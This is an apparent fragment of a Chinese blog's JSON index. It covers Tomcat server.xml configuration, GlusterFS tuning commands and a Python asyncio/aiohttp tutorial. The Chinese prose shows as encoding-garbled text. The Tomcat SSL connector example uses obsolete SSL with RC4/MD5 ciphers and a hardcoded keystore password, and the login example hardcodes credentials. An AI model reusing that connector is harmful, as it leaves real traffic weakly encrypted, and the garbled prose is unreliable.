/\u0026gt; Global Naming Resources \u0026lt;GlobalNamingResources\u0026gt; (è¡Œ 9-15) å®šä¹‰äº† JNDI (Java Naming and Directory Interface) èµ„æºï¼Œè¿™ä¸ªæ˜¯ LDAP çš„ä¸œè¥¿ï¼Œå…è®¸ java è½¯ä»¶é€šè¿‡ç›®å½•å‘ç°å¯¹è±¡å’Œå±æ€§å€¼ã€‚\nç¼ºçœå®šä¹‰äº†ä¸€ä¸ª UserDatabase çš„ JNDI èµ„æºï¼ˆè¡Œ 10-14ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡å…¶å®æ˜¯ä¸€ä¸ªå†…å­˜æ•°æ®åº“ï¼Œä¿å­˜ç€ä» conf/tomcat-users.xml ä¸­åŠ è½½ä¸Šæ¥çš„ç”¨æˆ·è®¤è¯æ•°æ®ã€‚\n1\u0026lt;GlobalNamingResources\u0026gt; 2 \u0026lt;Resource name=\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34; 3 type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34; 4 description=\u0026#34;User database that can be updated and saved\u0026#34; 5 factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34; 6 pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt; 7\u0026lt;/GlobalNamingResources\u0026gt; æˆ‘ä»¬å¯ä»¥å†å®šä¹‰ä¸€ä¸ª Mysql ä¹‹ç±»çš„ JNDI æ¥ä¿å­˜ mysql æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œç”¨æ¥å®ç°è¿æ¥æ± \nServices Service ç”¨æ¥å…³è”å¤šä¸ª Connectors åˆ° Engineã€‚ç¼ºçœçš„é…ç½®æ˜¯é…äº†ä¸€ä¸ª å«åš Catalina çš„ Service ï¼ŒCatalinna ç¼ºçœé…äº†ä¸¤ä¸ª Connectorsï¼Œä¸€ä¸ªæ˜¯8080çš„HTTPï¼Œä¸€ä¸ªæ˜¯8009çš„AJPã€‚\n1\u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; 2 \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; 3 connectionTimeout=\u0026#34;20000\u0026#34; 4 redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 5 \u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 6\u0026lt;/Service\u0026gt; æ³¨æ„æœ€ä¸Šé¢çš„é…ç½®ï¼Œæˆ‘ä»¬å–æ¶ˆäº†8009çš„AJPï¼Œè¿™ä¸ªåè®®ç°åœ¨åŸºæœ¬æ²¡äººç”¨ï¼Œå–æ¶ˆæ‰ä¹Ÿé¿å…å®‰å…¨é—®é¢˜ã€‚\nä¸‹é¢ç»™å‡ºä¸€ä¸ª SSL 8443 çš„ connectors çš„ä¾‹å­\n1 \u0026lt;Connector port=\u0026#34;8443\u0026#34; maxHttpHeaderSize=\u0026#34;8192\u0026#34; SSLEnabled=\u0026#34;true\u0026#34; server=\u0026#34;Rendoumi\u0026#34; 2 maxThreads=\u0026#34;150\u0026#34; minSpareThreads=\u0026#34;25\u0026#34; maxSpareThreads=\u0026#34;75\u0026#34; 3 enableLookups=\u0026#34;false\u0026#34; disableUploadTimeout=\u0026#34;true\u0026#34; 4 acceptCount=\u0026#34;100\u0026#34; scheme=\u0026#34;https\u0026#34; secure=\u0026#34;true\u0026#34; clientAuth=\u0026#34;false\u0026#34; 5 URIEncoding=\u0026#34;UTF-8\u0026#34; 6 sslProtocol=\u0026#34;SSL\u0026#34; 7 ciphers=\u0026#34;SSL_RSA_WITH_RC4_128_MD5, SSL_RSA_WITH_RC4_128_SHA\u0026#34; 8 keystoreFile=\u0026#34;/export/servers/tomcat/rendoumi.keystore\u0026#34; 9 keystorePass=\u0026#34;Fuck2020\u0026#34; /\u0026gt; Containers æ¦‚å¿µ Tomcat çš„å®¹å™¨æ¦‚å¿µï¼ŒTomcatè®¤ä¸º Engine, Host, Context å’Œ Clusterå¤„åœ¨åŒä¸€ä¸ªå®¹å™¨ä¸­. æœ€é¡¶å±‚çš„æ˜¯ Engine; æœ€åº•å±‚æ˜¯Contextã€‚\nå¦å¤–åƒ Realm å’Œ Valveï¼Œä¹Ÿå¯ä»¥æ”¾åœ¨å®¹å™¨ä¸­\nEngine Engine æ˜¯å®¹å™¨çš„é¡¶ç«¯ï¼Œå¯ä»¥åŒ…å«æœ‰è‹¥å¹² Hostsã€‚æˆ‘ä»¬å¯ä»¥é…ç½® tomcat æœåŠ¡å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚ä¸‹é¢é…ç½®å°±æ˜¯æœåŠ¡æœ¬æœºçš„ä¸€ä¸ªæœåŠ¡ã€‚\n1\u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; Catalina Engine ä» HTTP connector å¤„æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚å¤´ä¸­ Host: xxx çš„å†…å®¹ï¼ŒæŠŠè¯·æ±‚è·¯ç”±åˆ°æŸä¸ªå…·ä½“çš„ Hostä¸Šã€‚\nRealm Realm æœ¬è´¨æ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œæ˜¯ç”¨æ¥ä¿å­˜ç”¨æˆ·åã€å¯†ç ã€è®¤è¯è§’è‰²çš„ä¸œè¥¿ã€‚\n1\u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt; 2 \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34; resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt; 3\u0026lt;/Realm\u0026gt; Hosts Host å®šä¹‰äº†è™šæ‹Ÿä¸»æœºï¼Œå¯ä»¥å®šä¹‰å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å…¶ä¸­ appBase åƒä¸‡ä¸èƒ½ä¸ºç©ºï¼Œå¦åˆ™å°±å¯ä»¥è¯»åˆ° tomcat çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå°±å‡ºçº¿ä¸Šäº‹æ•…å¤§ Bug äº†ï¼ï¼ï¼\n1\u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; æˆ‘ä»¬æœ€ä¸Šé¢çš„ç”Ÿäº§é…ç½®ï¼Œä¸è‡ªè§£å‹ï¼Œä¹Ÿä¸è‡ªåŠ¨éƒ¨ç½²ã€‚\nValve Valve æ˜¯ç”¨æ¥æ‹¦æˆª HTTP requestsçš„ï¼Œåšé¢„å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒèƒ½åœ¨ Engine, Host, Context ä¸­è¢«å®šä¹‰ã€‚ä¸‹é¢çš„ä¾‹å­å°±æ˜¯åœ¨ Engine ä¸­åšäº†æ‹¦æˆªï¼Œå®šä¹‰äº†æ—¥å¿—æ ¼å¼ï¼Œäº¤ç»™ä¸‹ä¸€ä¸ªæ—¥å¿—å¤„ç†ç»„ä»¶åšå¤„ç†ã€‚\nç¼ºçœé…ç½®\n1\u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; 2 prefix=\u0026#34;localhost_access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; 3 pattern=\u0026#34;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026#34; /\u0026gt; æˆ‘ä»¬çš„é…ç½®ä¿®æ”¹äº†ç¼ºçœçš„æ—¥å¿—æ ¼å¼ï¼Œå¤šäº†å¾ˆå¤šæ˜ç»†çš„å†…å®¹ï¼Œæ”¹å˜äº†åˆ†å‰²ç¬¦ï¼š\n1\u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; 2 prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; 3 fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34; 4 pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; Context Contextå®šä¹‰äº†å…·ä½“çš„è®¿é—®è·¯å¾„ï¼Œä¸€å®šè¦æŒ‡å®š docBase ï¼ï¼ï¼å¤§å®¶ä¸€å®šè¦è®°ä½ appBase å’Œ docBase ä¸åŒä¸ºç©ºï¼ï¼ï¼\n1\u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; å¦‚ä¸Šï¼Œæˆ‘ä»¬å°±é…å¥½äº†ä¸€ä¸ªç”Ÿäº§ç¯å¢ƒçš„ server.xml ï¼Œæ³¨æ„ï¼Œè¿™ä¸ª xml æ–‡ä»¶æ˜¯å¯ä»¥æ”¾åœ¨è§£å¼€çš„tomcatå‹ç¼©åŒ… apache-tomcat-8.5.64 ç›®å½•ä¹‹å¤–çš„ã€‚\næˆ‘ä»¬å†å¦å¤–ç¼–å†™ä¸€ä¸ªå¯åŠ¨æ–‡ä»¶ start.shï¼š\n1#!/bin/sh 2export JAVA_OPTS=\u0026#34;-server -Xms1024m -Xmx2048m -Djava.awt.headless=true -Dsun.net.client.defaultConnectTimeout=60000 -Dsun.net.client.defaultReadTimeout=60000 -Djmagick.systemclassloader=no -Dnetworkaddress.cache.ttl=300 -Dsun.net.inetaddr.ttl=300\u0026#34; 3export CATALINA_HOME=/export/servers/tomcat/apache-tomcat-8.5.64 4 5cd /export/servers/tomcat/ 6$CATALINA_HOME/bin/catalina.sh start -config \u0026#34;/export/servers/tomcat/server.xml\u0026#34; è¿™æ ·ï¼Œæˆ‘ä»¬çš„å¯åŠ¨æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶ï¼Œå°±å’Œ tomcat ç›®å½•åˆ†ç¦»äº†ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯å¦‚æœ tomcat éœ€è¦å‡çº§ï¼Œé‚£ä¹ˆç›´æ¥è§£å‹æ¢ç›®å½•å³å¯ã€‚\næˆ‘ä»¬å¯ä»¥åšä¸ªè½¯é“¾æ¥ tomcat é“¾æ¥åˆ° apache-tomcat-8.5.64ï¼Œè¿™æ ·æ›´æ–¹ä¾¿æ“ä½œã€‚\n","date":"2021-11-15","img":"","permalink":"https://rendoumi.com/posts/20211115-tomcat_config/","series":null,"tags":null,"title":"Tomcat Server.xmlé…ç½®è¯¦ç»†è§£é‡Š"},{"categories":null,"content":"å…¬å¸ç”¨äº†6å¹´çš„GlusterFSç»ˆäºåˆ°äº†è¦è°ƒæ•´å·å‚æ•°çš„åœ°æ­¥äº†ã€‚\nå°æ–‡ä»¶å·²ç»å¤šåˆ°è¦å½±å“ IO çš„åœ°æ­¥äº†ã€‚\né¦–å…ˆè¯´ä¸€ä¸‹ç»“è®ºï¼ŒGlusterFS å®‰è£…å®Œæˆåï¼ŒåŸºæœ¬ä¸éœ€è¦è°ƒæ•´ä»»ä½•å‚æ•°ã€‚ç”Ÿäº§ç³»ç»Ÿåƒä¸‡ä¸å¯ç›²ç›®ï¼\nç„¶åæˆ‘ä»¬è¿™æ˜¯æœ‰ç‰¹æ®Šæƒ…å†µï¼Œæ‰€ä»¥è°ƒä¼˜æ­¥éª¤å¦‚ä¸‹ï¼ˆä»¥å·åä¸º esign-vol ä¸ºä¾‹ï¼‰ï¼š\n1#å¿…é¡»å…³æ‰NFS 2gluster volume set esign-vol nfs.disable on 3 4#å¿…é¡»ä¿ç•™10%çš„ç©ºé—´ï¼Œé¿å…å¡çˆ†å·ç©ºé—´ 5gluster volume set esign-vol cluster.min-free-disk 10% 6 7#æœ¬æœºæœ‰256Gçš„å†…å­˜ï¼Œæ‰€ä»¥è®¾ç½®25Gçš„è¯»ç¼“å­˜ 8gluster volume set esign-vol performance.cache-size 25GB 9#è¯»ç¼“å­˜ä¸­ï¼Œå•ä¸ªæ–‡ä»¶çš„ç¼“å­˜ï¼Œæœ€å¤§æ–‡ä»¶sizeæ˜¯128MBï¼Œå¤§äº128MBçš„å•ä¸ªæ–‡ä»¶ä¸ç¼“å­˜ 10gluster volume set esign-vol performance.cache-max-file-size 128MB 11 12#è®¾ç½®æ¯ä¸ªå®¢æˆ·ç«¯éƒ½å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯2ï¼Œå¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4 13gluster volume set esign-vol client.event-threads 4 14#è®¾ç½®æœåŠ¡å™¨ç«¯å¯¹ç‰¹å®šçš„å·å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯1,å¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4 15gluster volume set esign-vol server.event-threads 4 16 17#åˆ†å‰²çº¿ï¼Œä»¥ä¸‹å‚æ•°ä¸è¦è°ƒæ•´ï¼Œé™¤éæ˜ç¡®çŸ¥é“åæœ 18 19#è®¾ç½® io çº¿ç¨‹æ•°é‡ï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯16ï¼Œå·²ç»å¾ˆå¤§äº†ï¼Œè¶³å¤Ÿç”¨ 20gluster volume set esign-vol performance.io-thread-count 16 21#è®¾ç½®å†™ç¼“å†²åŒºï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯1Mï¼Œå¼„å¤§äº†å¦‚æœåœç”µä»€ä¹ˆçš„ï¼Œä¼šä¸¢æ•°æ® 22gluster volume set esign-vol performance.write-behind-window-size: 1M ä»¥ä¸Šå°±å¯ä»¥äº†ã€‚è¿˜æœ‰ä¸ªå‚æ•° global-threading ï¼Œç¼ºçœæ˜¯ offï¼Œä¸è¦è®¾ç½®ä¸º onï¼Œæœ‰ä½¿ç”¨æ¡ä»¶çš„ï¼Œå¼„é”™äº†åè€Œä¼šå¯¼è‡´æ€§èƒ½é™ä½ã€‚\n","date":"2021-11-15","img":"","permalink":"https://rendoumi.com/posts/20211115-gluster_tuning/","series":null,"tags":null,"title":"GlusterFSæ–‡ä»¶ç³»ç»Ÿçš„ä¼˜åŒ–"},{"categories":null,"content":"åœ¨å®é™…ä¸­é‡åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå…¬å¸è½¯ä»¶å‘å¸ƒä¸Šçº¿è‡ªåŠ¨åŒ–ã€‚\nè¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯éœ€è¦å»ç™»å½•ä¸€ä¸ªä¸Šçº¿çš„å†…éƒ¨ç½‘ç«™ï¼Œç„¶åçˆ¬ä¸‹æ‰€æœ‰çš„ä¸Šçº¿æ•°æ®ã€‚\nç„¶åæ ¹æ®çˆ¬ä¸‹æ¥çš„æ•°æ®æ•´ç†å¥½ï¼Œå¯ä»¥ä¸€èµ·ä¸Šçº¿çš„ï¼Œå°±å¹¶å‘å¤šçº¿ç¨‹ï¼Œå…¶å®å°±æ˜¯å»ä¼ å‚æ•°ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ç­‰è¿”å›ã€‚\nä¸èƒ½å¹¶å‘çš„å°±å•çº¿ç¨‹ç‚¹é“¾æ¥ã€‚\né‚£è¿™ä¸ªäº‹æƒ…å¿…é¡»æ›´æœ‰æ•ˆç‡ï¼Œå•çº¿ç¨‹çš„æ²¡é—®é¢˜ï¼Œç”¨ python çš„ request å°±å¯ä»¥å®ç°äº†ã€‚\næˆ‘ä»¬ä»”ç»†ç ”ç©¶ä¸€ä¸‹åç¨‹ï¼Œå…ˆè®²ä¸€ä¸‹å†å²ï¼š\nä½¿ç”¨Pythonçš„äººå¾€å¾€çº ç»“åœ¨å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ï¼Œå“ªä¸ªæ•ˆç‡æ›´é«˜ï¼Ÿåˆ°åº•ç”¨å“ªä¸ªå¥½å‘¢ï¼Ÿ\nå…¶å® Python çš„å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹ï¼Œç›¸å¯¹äºåˆ«å®¶çš„åç¨‹å’Œå¼‚æ­¥å¤„ç†æœºåˆ¶ï¼Œéƒ½ä¸è¡Œï¼Œçº¿ç¨‹ä¹‹é—´åˆ‡æ¢è€—è´¹ CPU å’Œå¯„å­˜å™¨ï¼ŒOS çš„è°ƒåº¦ä¸å¯æ§ï¼Œå¤šè¿›ç¨‹ä¹‹é—´é€šè®¯ä¹Ÿä¸ä¾¿ã€‚æ€§èƒ½æ ¹æœ¬ä¸è¡Œã€‚\nåæ¥å‘¢ Python æ”¹è¿›äº†è¯­æ³•ï¼Œå‡ºç°äº† yiled from å……å½“åç¨‹è°ƒåº¦ï¼Œæœ‰äººå°±æ ¹æ®è¿™ä¸ªç‰¹æ€§å¼€å‘äº†ç¬¬ä¸‰æ–¹çš„åç¨‹æ¡†æ¶ï¼ŒTornadoï¼ŒGeventç­‰ã€‚\nå®˜æ–¹ä¹Ÿä¸èƒ½åè§†ä¸ç†å•Šï¼Œä»»å‡­åˆ«äººå‡ºé£å¤´ï¼Œäºæ˜¯ Python ä¹‹çˆ¶æ·±å…¥ç®€å‡º3å¹´ï¼Œè‹¦å¿ƒé’»ç ”è‡ªå®¶çš„åç¨‹ï¼Œasync/await å’Œ asyncio åº“ï¼Œå¹¶æ”¾åˆ° Python3.5 åæˆä¸ºå®˜æ–¹åŸç”Ÿçš„åç¨‹ã€‚\nå¯¹äº httpè¯·æ±‚ã€è¯»å†™æ–‡ä»¶ã€è¯»å†™æ•°æ®åº“è¿™ç§é«˜å»¶æ—¶çš„ IO æ“ä½œï¼Œåç¨‹æ˜¯ä¸ªå¤§æ€å™¨ï¼Œä¼˜ç‚¹éå¸¸å¤šï¼›å®ƒå¯ä»¥åœ¨é¢„æ–™åˆ°ä¸€ä¸ªé˜»å¡å°†å‘ç”Ÿæ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œè·‘å»æ‰§è¡Œå…¶å®ƒåç¨‹ï¼ŒåŒæ—¶æŠŠäº‹ä»¶æ³¨å†Œåˆ°å¾ªç¯ä¸­ï¼Œå®ç°äº†å¤šåç¨‹å¹¶å‘ï¼Œå…¶å®è¿™ç©æ„æ˜¯è·Ÿ Nodejs çš„å›è°ƒå­¦çš„ã€‚\nçœ‹ä¸‹å›¾ï¼Œè¯¦ç»†è§£é‡Šä¸‹ï¼Œå·¦è¾¹æˆ‘ä»¬æœ‰100ä¸ªç½‘é¡µè¯·æ±‚ï¼Œå¹¶å‘100ä¸ªåç¨‹è¯·æ±‚ï¼ˆå…¶å®ä¹Ÿæ˜¯1ä¸ª1ä¸ªå‘ï¼‰ï¼Œå½“éœ€è¦ç­‰å¾…é•¿æ—¶é—´å›åº”å›åº”æ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶æ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°åˆ°äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰ä¸­ï¼Œæ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ï¼Œå½“æœ‰åç¨‹äº‹ä»¶å®Œæˆå†é€šè¿‡å›è°ƒå‡½æ•°å”¤é†’æŒ‚èµ·çš„åç¨‹ï¼Œç„¶åè¿”å›ç»“æœã€‚\nè¿™ä¸ªè·Ÿ nodejs çš„å›è°ƒå‡½æ•°åŸºæœ¬ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»æ³¨æ„ä¸»è¿›ç¨‹å’Œåç¨‹çš„å…³ç³»ï¼Œå¦‚æœæˆ‘åœ¨ä¸€ä¸ªä¸»è¿›ç¨‹ä¸­ï¼Œè§¦å‘åç¨‹å‡½æ•°ï¼Œæœ‰100ä¸ªåç¨‹ï¼Œé‚£ä¹ˆå¿…é¡»ç­‰å¾…100ä¸ªåç¨‹éƒ½ç»“æŸåï¼Œæ‰èƒ½å›åˆ°æ­£å¸¸çš„é‚£ä¸ªä¸»è¿›ç¨‹ä¸­ã€‚å½“ç„¶ï¼Œä¸»è¿›ç¨‹ä¹Ÿå¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ªåç¨‹ã€‚\né‚£ä¹ˆåç¨‹çš„åŸºæœ¬ç”¨æ³•\nasync f(n) å£°æ˜ä¸€ä¸ªå‡½æ•°æ˜¯åç¨‹çš„\nawait f(n) æŒ‚èµ·å½“å‰åç¨‹ï¼ŒæŠŠæ§åˆ¶æƒäº¤å› event loopï¼Œå¹¶ä¸”æ‰§è¡Œf(n)å’Œæ³¨å†Œä¹‹åçš„f(n)å›è°ƒã€‚\nä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœåœ¨ g() è¿™ä¸ªå‡½æ•°ä¸­æ‰§è¡Œäº† await f()ï¼Œé‚£ä¹ˆg()å‡½æ•°ä¼šè¢«æŒ‚èµ·ï¼Œå¹¶ç­‰å¾… f() å‡½æ•°æœ‰ç»“æœç»“æŸï¼Œç„¶åè¿”å› g() ç»§ç»­æ‰§è¡Œã€‚\n1async def get(url): 2 async with aiohttp.ClientSession() as session: 3 async with session.get(url) as response: 4 return await response.text() æœ€åä¸€è¡Œ await æ˜¯æŒ‚èµ·å‘½ä»¤ï¼ŒæŒ‚èµ·å½“å‰å‡½æ•° get() ï¼Œå¹¶æ‰§è¡Œ response.text() å’Œæ³¨å†Œå›è°ƒï¼Œç­‰å¾… response.text() æ‰§è¡Œå®Œæˆåé‡æ–°æ¿€æ´»å½“å‰å‡½æ•¸get()ç»§ç»­æ‰§è¡Œï¼Œè¿”å›ã€‚\næ‰€ä»¥ await åªå«åšæŒ‚èµ·æ˜¯ä¸å¤ªå¯¹çš„ï¼Œæ„Ÿè§‰åº”è¯¥å«åš æŒ‚èµ·å¹¶æ³¨å†Œå›è°ƒ æ¯”è¾ƒåˆé€‚ã€‚\nçœ‹ä»¥ä¸‹ç¨‹åºï¼Œåœ¨ Python 3.7 ä¹‹å‰ï¼Œåç¨‹æ˜¯è¿™ä¹ˆç”¨çš„ï¼š\n1import time 2import asyncio 3 4now = lambda : time.time() 5 6async def do_some_work(x): 7 print(\u0026#39;Waiting: \u0026#39;, x) 8 9start = now() 10coroutine = do_some_work(2) 11loop = asyncio.get_event_loop() 12loop.run_until_complete(coroutine) 13print(\u0026#39;TIME: \u0026#39;, now() - start) æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªåç¨‹ coroutine ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªäº‹ä»¶å¾ªç¯ loopï¼Œloop æ˜¯éœ€è¦ run_until_complete æ‰€æœ‰çš„åç¨‹ï¼Œç„¶åäº¤å‡ºæ§åˆ¶æƒï¼Œè¿”å›æ­£å¸¸çš„ä¸»è¿›ç¨‹ã€‚\nè·Ÿä¸Šå›¾å®Œå…¨åŒ¹é…ã€‚\nåœ¨ Python 3.7 ä¹‹åï¼Œç®€åŒ–äº†ç”¨æ³•ï¼Œä¸€å¥ asyncio.run å°±å¯ä»¥äº†ï¼š\n1asyncio.run(do_some_work(2)) ä¸Šé¢ç¨‹åºå°±å˜äº†ï¼Œçœäº†å¥½å¤šï¼Œä½†æ˜¯å‰¯ä½œç”¨æ˜¯ç¬¬ä¸€æ¬¡çœ‹åˆ°çš„äººä¼šä¸æ˜ç™½å®ƒæ˜¯æ€ä¹ˆè¿›åŒ–è¿‡æ¥çš„ï¼š\n1import time 2import asyncio 3 4now = lambda : time.time() 5 6async def do_some_work(x): 7 print(\u0026#39;Waiting: \u0026#39;, x) 8 9start = now() 10asyncio.run(do_some_work(2)) 11print(\u0026#39;TIME: \u0026#39;, now() - start) å¦‚æœæˆ‘ä»¬è¦è®¿é—®ä¸€ä¸ªç½‘ç«™çš„100ä¸ªç½‘é¡µï¼Œå•çº¿ç¨‹çš„åšæ³•æ˜¯ï¼šè¯·æ±‚ä¸€æ¬¡ï¼Œå›æ¥ä¸€æ¬¡ï¼Œç„¶åè¿›è¡Œä¸‹ä¸€ä¸ª\n1for url in urlsï¼š 2 response=get(url) 3 results=parse(response) è¿™æ ·æ•ˆç‡å¾ˆä½ï¼Œåç¨‹å‘¢ï¼Œåšæ³•å°±ä¸åŒäº†ï¼Œä¸€æ¬¡å‘èµ·100ä¸ªè¯·æ±‚ï¼ˆå‡†ç¡®çš„è¯´ä¹Ÿæ˜¯ä¸€ä¸ªä¸€ä¸ªå‘ï¼‰ï¼Œä¸åŒçš„æ˜¯åç¨‹ä¸ä¼šæ­»ç­‰è¿”å›ï¼Œè€Œæ˜¯å‘ä¸€ä¸ªè¯·æ±‚ï¼ŒæŒ‚èµ·ï¼Œå†å‘ä¸€ä¸ªå†æŒ‚èµ·ï¼Œå‘èµ·100ä¸ªï¼Œå°±æŒ‚èµ·100ä¸ªï¼Œç„¶åæ³¨å†Œå¹¶ç­‰å¾…100ä¸ªè¿”å›ï¼Œæ•ˆç‡æå‡äº†100å€ã€‚å¯ä»¥ç†è§£ä¸ºåŒæ—¶åšäº†100ä»¶äº‹ï¼Œåšåˆ°ç”±è‡ªå·±è°ƒåº¦è€Œä¸æ˜¯äº¤ç»™CPUï¼Œç¨‹åºçš„å¹¶å‘ç”±è‡ªå·±æ¥æ§åˆ¶ï¼Œè€Œä¸æ˜¯äº¤ç”± OS å»è°ƒåº¦ï¼Œæ•ˆç‡æå¤§çš„æé«˜äº†ã€‚\nè¿›åŒ–åˆ°åç¨‹ï¼Œæˆ‘ä»¬æŠŠè´¹ IO çš„ get å‡½æ•°æŠ½å‡ºæ¥æ”¾åˆ°åç¨‹é‡Œï¼š\n1async def get(url:str): 2 my_conn = aiohttp.TCPConnector(limit=10) 3 async with aiohttp.ClientSession(connector=my_conn) as session: 4 async with session.get(url) as resp: 5 return await resp.text() 6 7 8for url in urlsï¼š 9 response=asyncio.run(get(url)) 10 results=parse(response) 11 å…·ä½“åˆ°æˆ‘ä»¬çš„é¡¹ç›®ï¼Œæˆ‘ä»¬é¦–å…ˆè¦ç™»å½•ä¸€ä¸ªç½‘é¡µæ‹¿åˆ° cookieï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®å°±ä¸€ä¸ªåç¨‹ï¼Œæ²¡äººä¼šç™»å½•ä¸ªå‡ ç™¾æ¬¡å§ã€‚ç„¶åæŠŠæ”¾äº† cookie çš„ session å–å‡ºæ¥ï¼Œä¾›åé¢çš„åç¨‹å†å¤ç”¨å°±å¯ä»¥äº†ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\n1import aiohttp 2import asyncio 3 4async def login(): 5 my_conn = aiohttp.TCPConnector(limit=10) 6 async with aiohttp.ClientSession(connector=my_conn) as session: 7 data = {\u0026#39;loginname\u0026#39;:\u0026#39;wangbadan\u0026#39;,\u0026#39;password\u0026#39;:\u0026#39;Fuckyouall\u0026#39;} 8 async with session.post(\u0026#39;http://192.168.1.3/user/login\u0026#39;,data=data) as resp: 9 print(resp.url) 10 print(resp.status) 11 print(await resp.text()) 12 return session 13 14session = asyncio.run(login()) 15print(f\u0026#34;{session}\u0026#34;) å†ç»™ä¸€ä¸ªå®Œå…¨ç‰ˆçš„ä¸»å‡½æ•°æ˜¯è¿›ç¨‹ï¼Œä¸‹è½½æ˜¯åç¨‹çš„ä¾‹å­ï¼Œæ³¨æ„é‡Œé¢çš„ aiohttp.TCPConnector(limit=10)ï¼Œé™åˆ¶ä¸€ä¸‹å¹¶å‘æ˜¯10ä¸ªï¼Œå¦åˆ™ä¼šè¢«æœåŠ¡å™¨ Ban æ‰ï¼š\n1import asyncio 2import time 3import aiohttp 4from aiohttp.client import ClientSession 5 6async def download_link(url:str,session:ClientSession): 7 async with session.get(url) as response: 8 result = await response.text() 9 print(f\u0026#39;Read {len(result)} from {url}\u0026#39;) 10 11async def download_all(urls:list): 12 my_conn = aiohttp.TCPConnector(limit=10) 13 async with aiohttp.ClientSession(connector=my_conn) as session: 14 tasks = [] 15 for url in urls: 16 task = asyncio.ensure_future(download_link(url=url,session=session)) 17 tasks.append(task) 18 await asyncio.gather(*tasks,return_exceptions=True) # the await must be nest inside of the session 19 20url_list = [\u0026#34;https://www.google.com\u0026#34;,\u0026#34;https://www.bing.com\u0026#34;]*50 21print(url_list) 22start = time.time() 23asyncio.run(download_all(url_list)) 24end = time.time() 25print(f\u0026#39;download {len(url_list)} links in {end - start} seconds\u0026#39;) åç¨‹é‡Œçš„ session ä¹Ÿæœ‰å¾ˆå¤šç§ç”¨æ³•ï¼Œå‚è€ƒä¸‹é¢çš„é“¾æ¥å°±å¥½ï¼š\nhttps://blog.csdn.net/weixin_39643613/article/details/109171090 æˆ‘ä»¬ä¹Ÿç»™å‡ºç®€å•æ˜“ç”¨çš„çº¿ç¨‹æ± ç‰ˆï¼Œè¯´ä¸å®šä»¥åä¼šç”¨ä¸Šï¼š\n1import requests 2from requests.sessions import Session 3import time 4from concurrent.futures import ThreadPoolExecutor 5from threading import Thread,local 6 7url_list = [\u0026#34;https://www.google.com/\u0026#34;,\u0026#34;https://www.bing.com\u0026#34;]*50 8thread_local = local() 9 10def get_session() -\u0026gt; Session: 11 if not hasattr(thread_local,\u0026#39;session\u0026#39;): 12 thread_local.session = requests.Session() 13 return thread_local.session 14 15def download_link(url:str): 16 session = get_session() 17 with session.get(url) as response: 18 print(f\u0026#39;Read {len(response.content)} from {url}\u0026#39;) 19 20def download_all(urls:list) 